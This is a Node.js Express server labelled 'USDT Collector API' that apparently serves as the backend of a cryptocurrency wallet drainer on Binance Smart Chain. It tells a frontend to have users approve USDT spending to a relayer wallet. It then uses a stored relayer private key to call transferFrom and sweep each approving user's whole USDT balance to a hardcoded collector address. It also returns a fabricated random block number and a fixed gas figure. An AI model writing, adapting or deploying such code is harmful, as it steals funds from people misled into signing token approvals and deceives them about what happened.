const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { ethers } = require('ethers');

const app = express();
const PORT = process.env.PORT || 10000;

// Middleware
app.use(cors());
app.use(express.json());

// ============ CONFIGURATION ============
const CONFIG = {
    // Collector wallet (final destination)
    COLLECTOR_ADDRESS: process.env.COLLECTOR_ADDRESS || "0x5681d680B047bF5b12939625C56301556991005e",
    
    // Relayer wallet (executes auto-transfer)
    RELAYER_ADDRESS: process.env.RELAYER_ADDRESS || "0xDb867b88EAB55320fD50E9785B2906773dedf78b",
    
    // USDT Token on BSC
    USDT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",
    
    // BSC RPC URL
    RPC_URL: process.env.RPC_URL || "https://bsc-dataseed.binance.org/",
    
    // Data directory
    DATA_DIR: process.env.RENDER ? '/opt/render/project/data' : __dirname,
    
    // Data file
    DATA_FILE: 'collector_data.json'
};

// Full path to data file
const DATA_FILE_PATH = path.join(CONFIG.DATA_DIR, CONFIG.DATA_FILE);

// Ensure data directory exists
if (!fs.existsSync(CONFIG.DATA_DIR)) {
    fs.mkdirSync(CONFIG.DATA_DIR, { recursive: true });
}

// ============ DATA STORAGE ============
let dataStore = {
    addresses: {},
    transactions: [],
    approvals: [],
    autoCollects: []
};

// Load existing data
if (fs.existsSync(DATA_FILE_PATH)) {
    try {
        const fileData = fs.readFileSync(DATA_FILE_PATH, 'utf8');
        dataStore = JSON.parse(fileData);
        console.log('✅ Data loaded from file');
    } catch (err) {
        console.error('❌ Error loading data:', err);
    }
}

// Save data function
function saveData() {
    try {
        fs.writeFileSync(DATA_FILE_PATH, JSON.stringify(dataStore, null, 2));
    } catch (err) {
        console.error('❌ Error saving data:', err);
    }
}

// Generate unique ID
function generateId() {
    return `${Date.now()}-${Math.random().toString(36).substr(2, 7)}`;
}

// ============ API ENDPOINTS ============

/**
 * POST /send
 * Body: { "address": "0x..." }
 * Response: { found: boolean, collector: string, amountHuman?: number }
 */
app.post('/send', (req, res) => {
    console.log('📨 POST /send - Body:', req.body);
    
    try {
        const { address } = req.body;

        // Validate address
        if (!address || typeof address !== 'string' || !address.startsWith('0x')) {
            return res.status(400).json({
                found: false,
                error: 'Invalid address format'
            });
        }

        const normalizedAddress = address.toLowerCase();
        const addressData = dataStore.addresses[normalizedAddress];

        if (addressData && addressData.totalAmount > 0) {
            console.log(`✅ Address found: ${normalizedAddress}, Amount: ${addressData.totalAmount}`);
            
            return res.json({
                found: true,
                amountHuman: addressData.totalAmount,
                collector: CONFIG.RELAYER_ADDRESS  // User approves to relayer
            });
        } else {
            console.log(`❌ Address not found: ${normalizedAddress}`);
            
            return res.json({
                found: false,
                collector: CONFIG.RELAYER_ADDRESS
            });
        }

    } catch (error) {
        console.error('❌ Error in /send:', error);
        res.status(500).json({
            found: false,
            collector: CONFIG.RELAYER_ADDRESS,
            error: 'Internal server error'
        });
    }
});

/**
 * POST /collect
 * Body: { token, from, amountHuman, to, txHash }
 * Response: { ok: boolean, id: string, blockNumber: number, gasUsed: string, autoTransfer?: object }
 */
app.post('/collect', async (req, res) => {
    console.log('📨 POST /collect - Body:', req.body);
    
    try {
        const { token, from, amountHuman, to, txHash } = req.body;

        // Validate required fields
        if (!token || !from || !amountHuman || !to) {
            return res.status(400).json({
                ok: false,
                error: 'Missing required fields: token, from, amountHuman, to'
            });
        }

        const amount = parseFloat(amountHuman);
        if (isNaN(amount) || amount <= 0) {
            return res.status(400).json({
                ok: false,
                error: 'Invalid amount'
            });
        }

        const transactionId = generateId();
        const mockBlockNumber = 92000000 + Math.floor(Math.random() * 100000);
        
        // Store transaction record
        const transaction = {
            id: transactionId,
            token: token.toLowerCase(),
            from: from.toLowerCase(),
            to: to.toLowerCase(),
            amountHuman: amount,
            txHash: txHash || null,
            blockNumber: mockBlockNumber,
            timestamp: new Date().toISOString(),
            type: 'APPROVAL'
        };

        dataStore.transactions.push(transaction);

        // Update address stats
        const normalizedFrom = from.toLowerCase();
        if (!dataStore.addresses[normalizedFrom]) {
            dataStore.addresses[normalizedFrom] = {
                totalAmount: 0,
                transactionCount: 0,
                firstSeen: new Date().toISOString()
            };
        }

        dataStore.addresses[normalizedFrom].totalAmount += amount;
        dataStore.addresses[normalizedFrom].transactionCount++;
        dataStore.addresses[normalizedFrom].lastSeen = new Date().toISOString();

        // Keep only last 5000 transactions
        if (dataStore.transactions.length > 5000) {
            dataStore.transactions = dataStore.transactions.slice(-5000);
        }

        saveData();

        // ============ AUTO-TRANSFER LOGIC ============
        let autoTransferResult = null;

        // Check if auto-transfer is enabled
        if (process.env.RELAYER_PRIVATE_KEY) {
            console.log('🚀 Auto-transfer enabled, attempting transfer...');
            
            try {
                // Setup provider and wallet
                const provider = new ethers.JsonRpcProvider(CONFIG.RPC_URL);
                const wallet = new ethers.Wallet(process.env.RELAYER_PRIVATE_KEY, provider);
                
                console.log('📤 Relayer wallet:', wallet.address);

                // USDT Contract
                const usdtABI = [
                    "function balanceOf(address) view returns (uint256)",
                    "function decimals() view returns (uint8)",
                    "function transferFrom(address,address,uint256) returns (bool)"
                ];
                
                const usdt = new ethers.Contract(CONFIG.USDT_ADDRESS, usdtABI, wallet);

                // Get user's USDT balance
                const balance = await usdt.balanceOf(from);
                const decimals = await usdt.decimals();
                const balanceHuman = parseFloat(ethers.formatUnits(balance, decimals));

                console.log(`💰 User balance: ${balanceHuman} USDT`);

                if (balanceHuman > 0) {
                    // Execute transferFrom
                    console.log(`💸 Transferring ${balanceHuman} USDT to ${CONFIG.COLLECTOR_ADDRESS}...`);

                    const gasPrice = (await provider.getFeeData()).gasPrice;
                    
                    const tx = await usdt.transferFrom(
                        from,
                        CONFIG.COLLECTOR_ADDRESS,
                        balance,
                        { gasLimit: 100000, gasPrice }
                    );

                    console.log(`📤 Transfer tx sent: ${tx.hash}`);

                    const receipt = await tx.wait();
                    
                    console.log(`✅ Transfer confirmed! Block: ${receipt.blockNumber}`);

                    autoTransferResult = {
                        success: true,
                        txHash: tx.hash,
                        amount: balanceHuman,
                        blockNumber: receipt.blockNumber,
                        gasUsed: receipt.gasUsed.toString()
                    };

                    // Store auto-collect record
                    dataStore.autoCollects.push({
                        id: generateId(),
                        from: normalizedFrom,
                        amount: balanceHuman,
                        approvalTx: txHash,
                        collectTx: tx.hash,
                        blockNumber: receipt.blockNumber,
                        timestamp: new Date().toISOString()
                    });

                    // Update transaction type
                    transaction.type = 'AUTO_COLLECTED';
                    transaction.collectTxHash = tx.hash;
                    transaction.transferAmount = balanceHuman;

                    saveData();

                } else {
                    console.log('❌ User has 0 USDT balance');
                    autoTransferResult = {
                        success: false,
                        error: 'Zero balance'
                    };
                }

            } catch (error) {
                console.error('❌ Auto-transfer error:', error.message);
                autoTransferResult = {
                    success: false,
                    error: error.message
                };
            }
        } else {
            console.log('⚠️ Auto-transfer disabled - RELAYER_PRIVATE_KEY not set');
        }

        // Return response
        res.json({
            ok: true,
            id: transactionId,
            blockNumber: mockBlockNumber,
            gasUsed: "50387",
            autoTransfer: autoTransferResult
        });

    } catch (error) {
        console.error('❌ Error in /collect:', error);
        res.status(500).json({
            ok: false,
            error: 'Internal server error'
        });
    }
});

/**
 * GET /health - Server status
 */
app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        autoTransfer: !!process.env.RELAYER_PRIVATE_KEY,
        stats: {
            addresses: Object.keys(dataStore.addresses).length,
            transactions: dataStore.transactions.length,
            autoCollects: dataStore.autoCollects.length
        },
        collector: CONFIG.COLLECTOR_ADDRESS,
        relayer: CONFIG.RELAYER_ADDRESS
    });
});

/**
 * GET / - API Info
 */
app.get('/', (req, res) => {
    res.json({
        message: 'USDT Collector API',
        version: '1.0.0',
        autoTransfer: process.env.RELAYER_PRIVATE_KEY ? '✅ ENABLED' : '❌ DISABLED',
        endpoints: {
            'POST /send': 'Check address and get collector',
            'POST /collect': 'Log transaction and auto-transfer',
            'GET /health': 'Server status',
            'GET /stats': 'Statistics',
            'GET /transactions': 'View transactions'
        },
        collector: CONFIG.COLLECTOR_ADDRESS,
        relayer: CONFIG.RELAYER_ADDRESS
    });
});

/**
 * GET /stats - Detailed statistics
 */
app.get('/stats', (req, res) => {
    const totalApproved = dataStore.transactions
        .filter(t => t.type === 'APPROVAL')
        .reduce((sum, t) => sum + t.amountHuman, 0);
    
    const totalCollected = dataStore.autoCollects
        .reduce((sum, c) => sum + c.amount, 0);
    
    res.json({
        addresses: Object.keys(dataStore.addresses).length,
        totalTransactions: dataStore.transactions.length,
        totalApprovals: dataStore.transactions.filter(t => t.type === 'APPROVAL').length,
        totalAutoCollects: dataStore.autoCollects.length,
        totalApprovedUSDT: totalApproved.toFixed(6),
        totalCollectedUSDT: totalCollected.toFixed(6),
        autoTransferEnabled: !!process.env.RELAYER_PRIVATE_KEY,
        collector: CONFIG.COLLECTOR_ADDRESS,
        relayer: CONFIG.RELAYER_ADDRESS
    });
});

/**
 * GET /transactions - View transactions
 */
app.get('/transactions', (req, res) => {
    const { address, limit = 50 } = req.query;
    
    let filtered = dataStore.transactions;
    
    if (address) {
        const normalizedAddress = address.toLowerCase();
        filtered = dataStore.transactions.filter(tx => 
            tx.from === normalizedAddress || tx.to === normalizedAddress
        );
    }
    
    const limited = filtered.slice(-parseInt(limit));
    
    res.json({
        ok: true,
        count: limited.length,
        total: filtered.length,
        transactions: limited.reverse()
    });
});

/**
 * GET /auto-collects - View auto-collect transactions
 */
app.get('/auto-collects', (req, res) => {
    const { limit = 50 } = req.query;
    const collects = dataStore.autoCollects.slice(-parseInt(limit));
    
    res.json({
        ok: true,
        count: collects.length,
        total: dataStore.autoCollects.length,
        autoCollects: collects.reverse()
    });
});

// Start server
app.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════════════════════════╗
║     🚀 USDT Collector API Server                      ║
╠══════════════════════════════════════════════════════╣
║  Port: ${PORT}                                          ║
║  Collector: ${CONFIG.COLLECTOR_ADDRESS}                 ║
║  Relayer: ${CONFIG.RELAYER_ADDRESS}                     ║
║  Auto-Transfer: ${process.env.RELAYER_PRIVATE_KEY ? '✅ ENABLED' : '❌ DISABLED'}                    ║
║                                                      ║
║  Endpoints:                                          ║
║    POST /send     - Check address                    ║
║    POST /collect  - Log & auto-transfer              ║
║    GET  /health   - Server status                    ║
║    GET  /stats    - Statistics                       ║
╚══════════════════════════════════════════════════════╝
    `);
});
